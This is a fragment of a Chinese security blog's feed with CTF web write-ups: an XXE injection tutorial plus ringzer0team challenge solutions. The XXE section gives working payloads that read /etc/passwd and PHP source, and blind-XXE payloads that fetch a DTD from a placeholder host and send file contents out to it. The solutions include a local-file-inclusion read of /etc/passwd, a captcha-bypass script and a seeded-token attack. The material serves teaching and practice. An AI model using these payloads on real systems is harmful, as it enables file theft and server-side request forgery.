class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">	&lt;h3&gt;Yeah!! Here&apos;s your flag:PCTF&#123;M45t3r_oF_CuRl&#125;&lt;/h3&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PCTF&#123;M45t3r_oF_CuRl&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;jarvisoj-web-writeup&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>小试XML实体注入攻击</title>
    <link href="http://yoursite.com/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2017/07/04/小试XML实体注入攻击/</id>
    <published>2017-07-04T03:12:56.000Z</published>
    <updated>2017-07-04T12:41:44.389Z</updated>
    
    <content type="html"><![CDATA[<p>XML实体注入攻击<br><a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>XML（Extensible Markup Language）被设计用来传输和存储数据。关于它的语法，本文不准备写太多，只简单介绍一下。</p>
<h2 id="XML基本知识"><a href="#XML基本知识" class="headerlink" title="XML基本知识"></a>XML基本知识</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>chybeta<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>ph0en1x<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在上面代码中的第一行，定义XML的版本与编码。</p>
<p>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<code>&lt;note&gt;</code>是整个文档的根元素。嵌套在note标签中的<code>&lt;to&gt;</code>和<code>&lt;from&gt;</code>则是根的子元素。</p>
<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p>
<h3 id="实体类型"><a href="#实体类型" class="headerlink" title="实体类型"></a>实体类型</h3><p>XML实体分为四种：字符实体，命名实体，外部实体，参数实体。</p>
<h2 id="文档类型定义：DTD"><a href="#文档类型定义：DTD" class="headerlink" title="文档类型定义：DTD"></a>文档类型定义：DTD</h2><p>wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema languages。简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。</p>
<p>其基本格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE 根元素名 [  元素描述   ]&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="内部引入"><a href="#内部引入" class="headerlink" title="内部引入"></a>内部引入</h3><p>格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 "实体的值"&gt;</span></div></pre></td></tr></table></figure></p>
<p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span>  </div><div class="line"><span class="meta">&lt;!DOCTYPE xxe [  </span></div><div class="line">    &lt;!ENTITY  chybeta  "Hello World!"&gt;    </div><div class="line">]&gt;  </div><div class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </div><div class="line">    &amp;chybeta;</div><div class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问该XML文档，<code>&amp;chybeta;</code>会被解析为Hello World!并输出。</p>
<h3 id="外部引入"><a href="#外部引入" class="headerlink" title="外部引入"></a>外部引入</h3><p>基本格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></div></pre></td></tr></table></figure></p>
<p>通过引用定义在外部的DTD中的实体，我们称之为外部实体。<br>由于xxe漏洞主要利用的是外部实体，所以这里暂不展开。具体实例见下。</p>
<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="xxe注入"><a href="#xxe注入" class="headerlink" title="xxe注入"></a>xxe注入</h2><p>以php环境为例，index.php内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  $xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line">  print_r((string)$xml);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><p><img src="https://thief.one/upload_image/20170620/1.png" alt=""></p>
<p>利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取c盘里的TEST.txt。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///c://TEST.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>将上述xml进行url编码后传进去，可以发现读取了TEST.txt中的内容。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/2.jpg?raw=true" alt=""></p>
<p>我这里测试时，如果不进行url编码则不能成功解析。</p>
<p>若使用fill协议，在unix环境下，可以用如下xml来读取passwd：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///etc/passwd"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>如果要读取php文件，因为php、html等文件中有各种括号<code>&lt;</code>，<code>&gt;</code>，若直接用file读取会导致解析错误，此时可以利用<code>php://filter</code>将内容转换为base64后再读取。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这里同样先经过url编码后再传入。读取结果如下:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/3.jpg?raw=true" alt=""></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。这里暂不进行测试。</p>
<h3 id="内网探测-SSRF"><a href="#内网探测-SSRF" class="headerlink" title="内网探测/SSRF"></a>内网探测/SSRF</h3><p>由于xml实体注入攻击可以利用<code>http://</code>协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
<h2 id="bind-xxe"><a href="#bind-xxe" class="headerlink" title="bind xxe"></a>bind xxe</h2><p>以php环境为例，现在更改index.php内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  $xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>少了print_r，即没有回显消息。这个时候我们可以利用参数实体，通过发起http请求来攻击。</p>
<h3 id="读取本地文件-1"><a href="#读取本地文件-1" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "file:///c://TEST.txt"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在我的vps的xxe.xml的内容如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt;</div></pre></td></tr></table></figure></p>
<p>而测试文件TEST.txt内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta</div></pre></td></tr></table></figure></p>
<p>整个的调用过程如下：解析时<code>%dtd</code>引入xxe.xml，之后<code>%all</code>引入<code>send</code>的定义，最后引用了实体send，把<code>%file</code>文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true" alt=""></p>
<p>若要读取php等文件，同样需要先经过base64加密下。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>查看access.log:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/5.jpg?raw=true" alt=""></p>
<h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h4><p>发送的xml：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data  [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %send;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
<p>而在vps上的xxe.xml内容为：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload2 "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://yourvps/%file;'&gt;"&gt; %payload2;</div></pre></td></tr></table></figure></p>
<p>注意的是，<code>&amp;#25;</code> 不能直接写成<code>%</code>，否则无法解析。</p>
<p>xxe.xml中定义和引用了<code>%payload2</code>,在通过<code>%dtd</code>引入xxe.xml后，得以使用符号实体%send来进行发送。其中%file为读取的文件内容。查看access.log:</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/6.jpg?raw=true" alt=""></p>
<h1 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h1><h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><p>拿jarvisoj平台上的题目来小试牛刀吧。</p>
<p>题目：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="external">api调用</a></p>
<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/7.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/8.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/9.jpg?raw=true" alt=""></p>
<h2 id="xxe相关WP"><a href="#xxe相关WP" class="headerlink" title="xxe相关WP"></a>xxe相关WP</h2><ul>
<li><a href="http://z1ng.net/post/thoughts/alictf-2014-writeup" target="_blank" rel="external">AliCTF-Quals-2014 WebA-300</a></li>
<li><a href="https://github.com/iAklis/epub-library-challenge" target="_blank" rel="external">HCTF-2016 大图书管的牧羊人&amp;&amp;魔法禁书目录</a></li>
<li><a href="https://gist.github.com/h3xstream/3d51b99f651548f7fa2b" target="_blank" rel="external">GoSecure-CTF-2015 web-300</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XML实体注入攻击&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="XML注入" scheme="http://yoursite.com/tags/XML%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ringzer0team-web-writeup</title>
    <link href="http://yoursite.com/2017/06/30/%C2%96ringzer0team-web-writeup/"/>
    <id>http://yoursite.com/2017/06/30/ringzer0team-web-writeup/</id>
    <published>2017-06-30T10:10:49.505Z</published>
    <updated>2017-07-05T05:28:49.169Z</updated>
    
    <content type="html"><![CDATA[<p>ringzer0team-web<br><a id="more"></a></p>
<h1 id="Big-Brother-is-watching"><a href="#Big-Brother-is-watching" class="headerlink" title="Big Brother is watching"></a>Big Brother is watching</h1><p>题目地址： <a href="https://ringzer0team.com/challenges/212" target="_blank" rel="external">https://ringzer0team.com/challenges/212</a></p>
<p>题目提示：Even Google cannot find this onegoogle是搜索引擎，能阻止它的自然是。。。robots.txt啦<br>访问<a href="https://ringzer0team.com/robots.txt" target="_blank" rel="external">https://ringzer0team.com/robots.txt</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User-agent: *</div><div class="line">Disallow: /16bfff59f7e8343a2643bdc2ee76b2dc/</div></pre></td></tr></table></figure></p>
<p>访问 <a href="https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/" target="_blank" rel="external">https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/</a></p>
<p>得到flag；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-G5swO95w0c7R5fq0sa85nVs5dK49O04i</div></pre></td></tr></table></figure></p>
<h1 id="Looking-for-password-file"><a href="#Looking-for-password-file" class="headerlink" title="Looking for password file"></a>Looking for password file</h1><p>题目地址：<a href="http://ringzer0team.com:1008/?page=lorem.php" target="_blank" rel="external">http://ringzer0team.com:1008/?page=lorem.php</a></p>
<p>读取password，猜测是passwd文件。访问：<a href="http://ringzer0team.com:1008/?page=/etc/passwd" target="_blank" rel="external">http://ringzer0team.com:1008/?page=/etc/passwd</a></p>
<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-zH9g1934v774Y7Zx5s16t5ym8Z</div></pre></td></tr></table></figure></p>
<h1 id="Area-51"><a href="#Area-51" class="headerlink" title="Area 51"></a>Area 51</h1><p>题目地址：<a href="https://ringzer0team.com/challenges/48" target="_blank" rel="external">https://ringzer0team.com/challenges/48</a></p>
<p>题目提示：Access to this area is restricted using some secure .htaccess</p>
<p>.htaccess中可以限制各种请求。通过尝试后，抓包，改请求方式GET为PUT。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-w4KRr557y626izv567758O52</div></pre></td></tr></table></figure></p>
<h1 id="Headache"><a href="#Headache" class="headerlink" title="Headache"></a>Headache</h1><p>题目提示：Answer is closer than you think!</p>
<p>head，所以我们抓包看头部。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-365m4fU5p2DVEQbfrptDE5Ru]</div></pre></td></tr></table></figure></p>
<h1 id="Words-mean-something"><a href="#Words-mean-something" class="headerlink" title="Words mean something?"></a>Words mean something?</h1><p>给了一段不知所云的文字。。不懂就抓包咯。抓包后在cookie处发现<code>flag：0</code>。修改后发包得到flag：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/4.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-AnlAb6QxDpQvg1yn2bAhyOJw</div></pre></td></tr></table></figure></p>
<h1 id="Admin-Panel"><a href="#Admin-Panel" class="headerlink" title="Admin Panel"></a>Admin Panel</h1><p>有一个登陆框，随便输点什么进去，抓包后发现一个302跳转，在跳转页面里有一个奇怪的东西，见下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/5.jpg?raw=true" alt=""></p>
<p>将方法改成GET请求，在尾部添加：<code>?showflagforme=yesIwantafla</code>。见下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/6.jpg?raw=truehttps://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/6.jpg?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-Sfi8sZgAK0ddMjVSOQU2rMfUWS</div></pre></td></tr></table></figure></p>
<h1 id="Captcha-I"><a href="#Captcha-I" class="headerlink" title="Captcha I"></a>Captcha I</h1><p>题目地址：<a href="http://captcha.ringzer0team.com:7421/form1.php" target="_blank" rel="external">http://captcha.ringzer0team.com:7421/form1.php</a><br>测试一次后，题目提示说要验证一千次。查看源代码，可以发现如下js代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">doIt</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	<span class="keyword">var</span> A = <span class="built_in">document</span>.getElementById(<span class="string">'captcha-form'</span>).value;</div><div class="line">	<span class="keyword">if</span> (A == <span class="string">"ehage"</span>)&#123;</div><div class="line">		<span class="built_in">document</span>.forms[<span class="string">"Form1"</span>].submit();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		alert(<span class="string">"BAD Captcha"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
<p>其中if判断条件里的<code>ehage</code>就是当前的验证码，所以只要写脚本提取出这段字符串，然后再发包就行啦。脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">cookie = &#123;<span class="string">'_ga'</span>:<span class="string">'GA1.2.1373385590.1498799275'</span>,<span class="string">'_gid'</span>:<span class="string">'GA1.2.867459789.1498799275'</span>,<span class="string">'_gat'</span>:<span class="string">'1'</span>,<span class="string">'PHPSESSID'</span>:<span class="string">'1kr76vh1164sbgeflnngimi321'</span>&#125;</div><div class="line">url = <span class="string">'http://captcha.ringzer0team.com:7421'</span></div><div class="line">headers = &#123;<span class="string">'Authorization'</span>:<span class="string">'Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='</span>&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">	 <span class="comment"># get captacha</span></div><div class="line">	 r = requests.get(<span class="string">"http://captcha.ringzer0team.com:7421/form1.php"</span>,cookies=cookie,headers=headers)</div><div class="line">	 start_addr = r.text.find(<span class="string">'if (A == "'</span>) + len(<span class="string">'if (A == "'</span>)</div><div class="line">	 end_addr = r.text.find(<span class="string">'"'</span>,start_addr)</div><div class="line">	 captcha = r.text[start_addr:end_addr]</div><div class="line">	 print(i,<span class="string">":"</span>,captcha)</div><div class="line">	 k = requests.get(<span class="string">"http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new"</span>,cookies=cookie,headers=headers)</div><div class="line">	 data = &#123;<span class="string">'captcha'</span>: captcha&#125;</div><div class="line">	 k = requests.post(<span class="string">'http://captcha.ringzer0team.com:7421/captcha1.php'</span>,cookies=cookie,headers=headers,data=data)</div></pre></td></tr></table></figure></p>
<p>跑完后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congrats The flag is &quot;9bc635d4385e8a1775ad98980f44eb7d1714f69b&quot;</div></pre></td></tr></table></figure></p>
<h1 id="Password-reset"><a href="#Password-reset" class="headerlink" title="Password reset"></a>Password reset</h1><p>有一个登陆框，需要用户名和密码，还有一个重置（reset）功能。题目提供了源码。如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset_username'</span>])) &#123;</div><div class="line">		srand(time());</div><div class="line">		$token =</div><div class="line">		rand(<span class="number">1000000000000000</span>,<span class="number">9999999999999999</span>);</div><div class="line"></div><div class="line">		$success = <span class="string">'&lt;div class="success"&gt;Reset password link has been sent to admin@youdontownthisemail.com. Please follow the link ...'</span></div><div class="line">		$hSql-&gt;FastQuery(<span class="string">'DELETE FROM chal_113 WHERE ip_addr = ?'</span>, <span class="keyword">array</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</div><div class="line">		$hSql-&gt;FastQuery(<span class="string">'insert into chal_113 values (?,?,?)'</span>, <span class="keyword">array</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>], $token, time() + <span class="number">3600</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(URL_HANDLE::GetInstance()-&gt;get-&gt;k != <span class="keyword">null</span>) &#123;</div><div class="line">		$result = reset($hSql-&gt;FastQuery(<span class="string">'SELECT * FROM chal_113 WHERE ip_addr = ? AND recovery_key = ? '</span>, <span class="keyword">array</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>], URL_HANDLE::GetInstance()-&gt;get-&gt;k)));</div><div class="line">		<span class="keyword">if</span>($hSql-&gt;RowCount() != <span class="number">0</span>) &#123;</div><div class="line">				<span class="keyword">if</span>($result-&gt;expired_time &gt; time()) &#123;</div><div class="line">						$success = <span class="string">'&lt;div class="success"&gt;Here\'s your new password: XXXXXXXXXXXXXX&lt;/div&gt;'</span>;</div><div class="line">				&#125; <span class="keyword">else</span> &#123;</div><div class="line">						$success = <span class="string">'&lt;div class="error"&gt;Expired recovery key!&lt;/div&gt;'</span>;</div><div class="line">				&#125;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$success = <span class="string">'&lt;div class="error"&gt;Invalid recovery key!&lt;/div&gt;'</span>;</div><div class="line">		&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>伪随机数问题，还有就是关于unix时间戳的知识。目标很明确要对admin重置密码，当点了reset后，会根据当前的time生成一个token并存放在数据库中，这个就是下文的k值。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/8.jpg?raw=true" alt=""></p>
<p>注意图片中是：2017 06:39:41 -0400。记得计算上时差为4个小时。所以实际时间应该是2017-07-01 10:39:41。写一个php脚本，生成需要的16位的digit code。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$t = strtotime(<span class="string">'2017-07-01 10:39:41'</span>);</div><div class="line"><span class="keyword">echo</span>($t . <span class="string">"&lt;br&gt;"</span>);</div><div class="line">srand($t);</div><div class="line">$token = rand(<span class="number">1000000000000000</span>,<span class="number">9999999999999999</span>);</div><div class="line"><span class="keyword">echo</span> $token;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>上面代码在win平台下无法生成16位的code，这个不知道为什么。。。我换到unix环境后生成的token为 32933381064794967。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ringzer0team.com/challenges/113/?k=3293338106479496</div></pre></td></tr></table></figure></p>
<p>得到hint：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Here&apos;s your new password: Thi%P@s50rD!sM1n3*</div></pre></td></tr></table></figure></p>
<p>登陆，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-DlwwTV7vCQf4Dn281Yhb802x5U</div></pre></td></tr></table></figure></p>
